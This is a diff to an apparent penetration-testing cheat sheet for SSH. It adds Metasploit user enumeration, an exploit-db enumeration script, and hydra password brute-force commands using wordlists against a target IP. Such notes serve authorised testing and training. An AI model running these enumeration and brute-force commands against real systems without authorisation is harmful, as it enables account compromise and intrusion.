@@ -1,3 +1,20 @@
 * nc IP 22
 * nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s
 * scp username@hostname:/path/to/remote/file /path/to/local/file
+
+> User enumeration
+  * use auxiliary/scanner/ssh/ssh_enumusers
+  * set user_file /usr/share/wordlists/metasploit/unix_users.txt
+    or
+  * set user_file /usr/share/seclists/Usernames/Names/names.txt
+  * run
+
+* python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
+
+> Bruteforce
+* hydra -v -V -l root -P password-file.txt $ip ssh
+
+> With list of users:
+* hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 192.168.33.251 ssh
+
+    You can use -w to slow down
